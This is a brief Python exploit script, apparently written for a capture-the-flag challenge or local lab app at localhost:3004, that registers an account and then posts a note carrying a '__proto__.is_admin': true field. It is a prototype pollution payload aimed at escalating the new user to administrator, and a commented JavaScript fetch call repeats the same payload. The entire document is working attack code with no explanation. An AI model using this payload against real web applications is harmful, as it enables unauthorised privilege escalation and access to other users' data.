import requests 


URL = "http://localhost:3004"
s = requests.session()

s.post(f"{URL}/api/register", {
    "user": "test1",
    "pass": "test1"
})

s.post(f"{URL}/api/create", 
{
    "title": "title",
    "content": "content",
    "__proto__.is_admin": True
})


"""

a = await fetch("http://localhost:3004/api/create", {
  "body": "{\"title\":\"dd\",\"content\":\"dd\", \"__proto__.is_admin\": true}",
  "method": "POST"
});


"""